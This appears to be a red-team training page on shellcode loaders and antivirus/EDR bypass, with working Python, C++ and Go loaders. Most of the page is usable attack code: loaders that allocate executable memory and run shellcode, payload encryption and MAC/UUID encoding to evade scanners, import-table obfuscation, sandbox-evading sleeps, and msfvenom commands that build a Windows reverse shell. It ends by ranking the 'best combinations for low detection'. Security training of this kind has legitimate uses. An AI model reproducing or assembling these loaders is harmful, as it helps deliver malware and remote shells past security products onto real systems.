---
layout: training-page
title: "Shellcode Loaders & AV Bypass Techniques — Red Team Academy"
module: "Evasion"
tags:
  - shellcode-loader
  - av-bypass
  - python-ctypes
  - windows-api
  - uuid-encoding
  - mac-encoding
  - iat-obfuscation
  - go-loader
page_key: "evasion-shellcode-loaders"
render_with_liquid: false
---

# Shellcode Loaders & AV Bypass Techniques

A shellcode loader allocates executable memory, copies shellcode into it, and transfers execution. Each variation changes *how* those steps are performed to frustrate static and behavioral AV/EDR detection. This page covers Python, C++, and Go loader patterns from the AV-Bypass-codes collection, progressing from basic to more evasive techniques.

## Detection Signal Reference

Understanding what triggers detection helps choose the right loader variant.

```
# Highest-risk API call sequences (EDR alert priority):
# 1. VirtualAlloc(PAGE_EXECUTE_READWRITE)      — single RWX allocation, most flagged
# 2. VirtualAlloc(RW) → VirtualProtect(RX)    — two-step, less flagged but still monitored
# 3. CreateThread(shellcode_addr)             — executing freshly-allocated memory
# 4. WriteProcessMemory → CreateRemoteThread  — cross-process injection
# 5. GetProcAddress("VirtualAlloc")           — dynamic API resolution (IAT obfuscation)

# Lower-risk alternatives:
# - HeapCreate(HEAP_CREATE_ENABLE_EXECUTE) → HeapAlloc  — heap-based exec, less monitored
# - EnumWindows / EnumSystemLanguageGroupsA as execution primitive (callback-based)
# - Named pipes to transfer shellcode at runtime (avoids static shellcode in binary)
# - Encoding shellcode as MAC addresses or UUIDs (no obvious byte pattern)
```

## Python Ctypes Loaders

Python ctypes binds directly to Windows DLLs without compiling a binary. Useful for LOLBin delivery (run via python.exe) or when dropping a .py / .pyc file is acceptable.

### Basic Python Loader

```
import ctypes

# Shellcode as bytearray — replace with msfvenom output:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f py
shellcode = bytearray(b"\xfc\x48\x83\xe4\xf0...")

# VirtualAlloc must return a 64-bit pointer on x64:
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# Allocate RWX memory (simplest, highest detection risk):
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),            # lpAddress: let OS choose
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),       # MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40)          # PAGE_EXECUTE_READWRITE
)

# Copy shellcode into allocated buffer:
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode))
)

# Execute in new thread:
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0), ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
```

### Python + AES Encryption

Encrypt the raw shellcode binary before embedding it. AES-CBC hides the byte pattern from static scanners. Decrypt at runtime just before execution.

```
# Step 1 — encrypt shellcode offline (aes_encode.py):
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

shellcode = open("payload.bin", "rb").read()
key = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC)
ct_bytes = cipher.encrypt(pad(shellcode, AES.block_size))

print(f"iv  = '{b64encode(cipher.iv).decode()}'")
print(f"key = {key}")       # keep this secret / hardcode in loader
print(f"ct  = '{b64encode(ct_bytes).decode()}'")

# Step 2 — loader (aes_shellcode_loader.py) — paste values from above:
import ctypes
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

iv  = 'BASE64_IV_HERE'
key = b'16_BYTE_KEY_HERE'
ct  = 'BASE64_CIPHERTEXT_HERE'

iv  = b64decode(iv)
ct  = b64decode(ct)
cipher   = AES.new(key, AES.MODE_CBC, iv)
shellcode = bytearray(unpad(cipher.decrypt(ct), AES.block_size))

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000), ctypes.c_int(0x40)
)
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr),
    ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
```

### Python + PEM Encoding

Uses Python's `Crypto.IO.PEM` to encode shellcode as a PEM certificate block — the payload looks like a certificate in the binary.

```
# Encode (pem_encode.py):
from Crypto.IO import PEM
buf = open("payload.bin", "rb").read()
encoded = PEM.encode(buf, marker="CERTIFICATE", passphrase=b'secretkey', randfunc=None)
print(encoded)   # looks like -----BEGIN CERTIFICATE----- ...

# Loader (pem_shellcode_loader.py):
import ctypes
from Crypto.IO import PEM
pem_data = b"""-----BEGIN CERTIFICATE-----
... paste PEM output here ...
-----END CERTIFICATE-----"""
shellcode = bytearray(PEM.decode(pem_data, passphrase=b'secretkey')[0])
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000), ctypes.c_int(0x40)
)
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr),
    ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
```

### Python Variable Randomization

Randomizes variable names and inserts junk arithmetic statements between API calls. Defeats simple string-matching rules that look for `ctypes`, `shellcode`, `VirtualAlloc` as identifiers.

```
# random_variable.py — generates a randomized loader each run:
import random, string

class AutoRandom:
    def auto_random_str(self, min_length=8, max_length=15):
        length = random.randint(min_length, max_length)
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    def auto_random_void_command(self):
        # Returns a random junk arithmetic or string statement
        s = self.auto_random_str
        return random.choice([
            f'{s()} = {random.randint(0,99999)} + {random.randint(0,99999)}',
            f'{s()} = "{s()}" + "{s()}"',
            f'print("{s()}")',
        ])

# Usage: replace sentinel tokens in loader template, then print result:
# shellcodeloader = template.replace("ctypes", random_name)
#                            .replace("shellcode", random_name)
#                            .replace("ptr", random_name)
#                            .replace("handle", random_name)
# Insert junk commands at "command1" ... "command7" placeholders
```

## C++ Loader Variants

Compile with: `x86_64-w64-mingw32-g++ -O2 loader.cpp -o loader.exe -static-libstdc++ -static-libgcc`

### Two-Step VirtualProtect (RW → RX)

Allocate as read-write, copy shellcode, flip to read-execute. Avoids creating a single RWX region — the most flagged memory attribute combination.

```
// VirtualProtectShellcodeLoader.cpp
#include <Windows.h>

unsigned char buf[] = "\xfc\x48\x83\xe4...";  // XOR-encoded shellcode
int shellcode_size = sizeof(buf);
DWORD dwOldProtect;

// XOR decode at runtime (key = 10):
for (int i = 0; i < shellcode_size; i++) buf[i] ^= 10;

// Step 1: Allocate READ-WRITE only:
char* shellcode = (char*)VirtualAlloc(NULL, shellcode_size,
    MEM_COMMIT, PAGE_READWRITE);

// Step 2: Copy in decoded shellcode:
CopyMemory(shellcode, buf, shellcode_size);

// Step 3: Change protection to EXECUTE only (no write):
VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &dwOldProtect);

// Optional: sleep to skip sandbox (many run for <30s):
Sleep(2000);

HANDLE hThread = CreateThread(NULL, NULL,
    (LPTHREAD_START_ROUTINE)shellcode, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINITE);
```

IAT Obfuscation — Dynamic API Resolution

Resolves API function pointers at runtime via `GetProcAddress` rather than linking them at compile time. The import table (IAT) of the PE does not show VirtualAlloc, CreateThread, etc., defeating tools that scan imports for suspicious API usage.

```
// IATShellcodeLoader.cpp — key concept: function pointer typedefs
#include <Windows.h>
#include <intrin.h>

// Define function pointer types matching each Windows API signature:
typedef LPVOID (WINAPI* ImportVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI* ImportCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
    LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL   (WINAPI* ImportVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD  (WINAPI* ImportWaitForSingleObject)(HANDLE, DWORD);

int wmain() {
    // Resolve APIs at runtime — not present in import table:
    ImportVirtualAlloc      MyVirtualAlloc      = (ImportVirtualAlloc)
        GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualAlloc");
    ImportCreateThread      MyCreateThread      = (ImportCreateThread)
        GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateThread");
    ImportVirtualProtect    MyVirtualProtect    = (ImportVirtualProtect)
        GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualProtect");
    ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)
        GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "WaitForSingleObject");

    char buf[] = "\xf6\x42\x89\xee...";  // XOR-encoded shellcode
    int shellcode_size = sizeof(buf);
    DWORD dwOldProtect;

    // XOR decode (key = 10) using _InterlockedXor8 intrinsic:
    for (int i = 0; i < shellcode_size; i++) _InterlockedXor8(buf + i, 10);

    char* shellcode = (char*)MyVirtualAlloc(NULL, shellcode_size,
        MEM_COMMIT, PAGE_READWRITE);
    CopyMemory(shellcode, buf, shellcode_size);
    MyVirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &dwOldProtect);
    Sleep(2000);
    HANDLE hThread = MyCreateThread(NULL, NULL,
        (LPTHREAD_START_ROUTINE)shellcode, NULL, NULL, NULL);
    MyWaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

### MAC Address Encoding

Shellcode bytes are formatted as MAC address strings (6 bytes each). The loader calls `RtlEthernetStringToAddressA` (from ntdll) to decode them back into executable memory. The payload is stored as strings like `"FC-48-83-E4-F0-E8"` — no raw shellcode bytes in the binary.

```
# Step 1 — Python converter (ShellcodeToMAC.py):
def convertToMAC(shellcode):
    if len(shellcode) % 6 != 0:
        shellcode += b"\x00" * (6 - (len(shellcode) % 6))  # pad to 6-byte boundary
    mac = []
    for i in range(0, len(shellcode), 6):
        chunk = shellcode[i:i+6]
        mac.append("-".join(f"{b:02X}" for b in chunk))
    return mac

buf = open("payload.bin", "rb").read()
macs = convertToMAC(buf)
# Output: ["FC-48-83-E4-F0-E8", "00-00-00-00-41-51", ...]
print('const char* mac_[] = {' + ", ".join(f'"{m}"' for m in macs) + '};')
```

```
// MACShellcodeLoader.cpp — paste mac_[] array from Python output:
#include <Windows.h>
#include <ip2string.h>
#pragma comment(lib, "Ntdll.lib")

const char* mac_[] = {
    "FC-48-83-E4-F0-E8",
    // ... all MAC strings ...
};

int main() {
    // HeapCreate with EXECUTE flag — avoids VirtualAlloc entirely:
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* SB = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)SB;

    int elems = sizeof(mac_) / sizeof(mac_[0]);
    PCSTR Terminator = NULL;

    // RtlEthernetStringToAddressA decodes each MAC string back to 6 bytes:
    for (int i = 0; i < elems; i++) {
        RtlEthernetStringToAddressA(mac_[i], &Terminator, (DL_EUI48*)hptr);
        hptr += 6;
    }
    // Execute via EnumWindows callback — no CreateThread call:
    EnumWindows((WNDENUMPROC)SB, 0);
    return 0;
}
```

### UUID Encoding

Similar to MAC encoding but uses 16-byte UUID strings. Decoded via `UuidFromStringA` (Rpcrt4.dll). The payload looks like a list of GUIDs.

```
# Step 1 — Python converter (binToUUIDs.py):
# Usage: python3 binToUUIDs.py shellcode.bin
from uuid import UUID
import sys

with open(sys.argv[1], "rb") as f:
    data = f.read()

out = ""
offset = 0
while offset < len(data):
    chunk = data[offset:offset+16]
    if len(chunk) < 16:
        chunk += b'\x00' * (16 - len(chunk))  # pad final block
    uuid = UUID(bytes_le=chunk)   # bytes_le = little-endian UUID format
    out += f'"{uuid}",\n'
    offset += 16

print(out)  # paste into C++ array below
```

```
// UUIDShellcodeLoader.cpp:
#include <Windows.h>
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

const char* buf[] = {
    "e48348fc-e8f0-00c8-0000-415141505251",
    // ... all UUID strings ...
};

int main() {
    int dwNum = sizeof(buf) / sizeof(buf[0]);

    // HeapCreate with execute — avoids VirtualAlloc:
    HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
    PVOID pMemory  = HeapAlloc(hMemory, 0, 1024);
    DWORD_PTR CodePtr = (DWORD_PTR)pMemory;

    // UuidFromStringA decodes each UUID string back to 16 raw bytes:
    for (size_t i = 0; i < dwNum; i++) {
        RPC_STATUS status = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);
        if (status != RPC_S_OK) return -1;
        CodePtr += 16;
    }
    // Execute via EnumSystemLanguageGroupsA callback:
    EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, NULL);
    return 0;
}
```

### Named Pipe Shellcode Delivery

Shellcode is transferred at runtime over a named pipe instead of being stored in the binary. The stager creates a named pipe, a second thread writes the shellcode into it, the main thread reads it out and executes it. No static shellcode bytes in the PE.

```
// PipeShellcodeLoader.cpp — conceptual pattern:
// 1. Create named pipe:
HANDLE hPipe = CreateNamedPipe("\\\\.\\pipe\\PipeName",
    PIPE_ACCESS_INBOUND,
    PIPE_TYPE_BYTE | PIPE_WAIT,
    PIPE_UNLIMITED_INSTANCES,
    1024, 1024, 0, NULL);

// 2. Spawn writer thread (or connect from second process):
//    Writer connects as client, calls WriteFile(shellcode)

// 3. Main thread connects client, reads shellcode:
ConnectNamedPipe(hPipe, NULL);
ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);

// 4. Allocate, copy, execute:
char* shellcode = (char*)VirtualAlloc(NULL, dwLen, MEM_COMMIT, PAGE_READWRITE);
CopyMemory(shellcode, szBuffer, dwLen);
VirtualProtect(shellcode, dwLen, PAGE_EXECUTE, &dwOldProtect);
Sleep(2000);
HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)shellcode, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINITE);
```

## Go Loaders

Go binaries are statically compiled and don't use the Windows PE import table in the usual way. `syscall.MustLoadDLL` loads DLLs at runtime; the import table shows only the Go runtime, not `kernel32.dll` directly.

### Go Basic Loader

```
// basic_shellcode_loader.go
package main

import ("os"; "syscall"; "unsafe")

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    ntdll         = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")

    // Replace with your shellcode bytes:
    shellcode = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, ...}
)

func main() {
    // Allocate RWX memory via VirtualAlloc:
    addr, _, err := VirtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    if addr == 0 { println(err.Error()); os.Exit(1) }

    // Copy shellcode into allocation:
    _, _, _ = RtlCopyMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )

    // Execute via syscall (avoids CreateThread API call):
    syscall.Syscall(addr, 0, 0, 0, 0)
}
```

### Go Base64 Loader

```
// base64_shellcode_loader.go — decode at runtime, no raw bytes in binary
package main

import ("encoding/base64"; "syscall"; "unsafe")

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    ntdll         = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
    // Base64-encoded shellcode — paste output of:
    // cat payload.bin | base64 -w 0
    b64 := "BASE64_SHELLCODE_HERE"
    shellcode, _ := base64.StdEncoding.DecodeString(b64)

    addr, _, _ := VirtualAlloc.Call(
        0, uintptr(len(shellcode)),
        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    )
    _, _, _ = RtlCopyMemory.Call(
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )
    syscall.Syscall(addr, 0, 0, 0, 0)
}

// Compile for Windows from Linux:
// GOOS=windows GOARCH=amd64 go build -o loader.exe loader.go
```

## Evasion Technique Comparison

```
# Technique                Detection Risk    Notes
# ─────────────────────────────────────────────────────────────────────
# RWX VirtualAlloc         HIGH              Single alloc with exec perm — most flagged
# RW alloc → VirtualProtect MEDIUM           Two-step, cleaner signal but still monitored
# IAT obfuscation          MEDIUM-LOW        Cleans import table, APIs still called
# XOR/AES encrypted payload LOW (static)    Defeats sig scanning, not behavioral
# MAC/UUID encoding        LOW (static)      No raw shellcode bytes in binary
# HeapCreate(EXECUTE)      LOW-MEDIUM        Less scrutinized than VirtualAlloc
# Named pipe delivery      LOW               Shellcode not in binary at all
# Callback execution       MEDIUM            EnumWindows/EnumSystemLanguageGroups
#   (no CreateThread)                        avoids CreateThread API call
# Go syscall.Syscall       LOW-MEDIUM        Bypasses some userland hooks

# Best combinations for low detection:
# 1. AES/XOR encrypt + IAT obfuscation + VirtualProtect two-step + Sleep(2000)
# 2. UUID/MAC encoding + HeapCreate(EXECUTE) + callback execution
# 3. Go base64 loader + syscall.Syscall (no CreateThread)
# 4. Named pipe delivery + VirtualProtect two-step
```

## Generating Encoded Shellcode

```
# Generate raw shellcode binary for encoding:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o payload.bin

# XOR encode for C++ loaders (key = 10 matches the decoders above):
python3 -c "
import sys
key = 10
data = open('payload.bin','rb').read()
enc  = bytes([b ^ key for b in data])
# Print as C char array:
print('unsigned char buf[] = {' + ','.join(f'0x{b:02x}' for b in enc) + '};')
" > encoded_shellcode.h

# AES encrypt for Python loader:
python3 aes_encode.py  # outputs iv, key, ciphertext

# Convert to MAC addresses:
python3 ShellcodeToMAC.py  # outputs C++ const char* array

# Convert to UUIDs:
python3 binToUUIDs.py payload.bin  # outputs C++ const char* array

# Base64 for Go loader:
base64 -w 0 payload.bin
```

## Resources

- AV-Bypass-codes — `github.com/purewhitehat/AV-Bypass-codes`
- pycryptodome — `pypi.org/project/pycryptodome/`
- ScareCrow (automated evasive loader generation) — `github.com/optiv/ScareCrow`
- Donut (shellcode from .NET/PE/script) — `github.com/TheWover/donut`
- PEzor (PE packer and loader) — `github.com/phra/PEzor`
- MITRE ATT&CK T1027.002 — Obfuscated Files: Software Packing
- MITRE ATT&CK T1055 — Process Injection
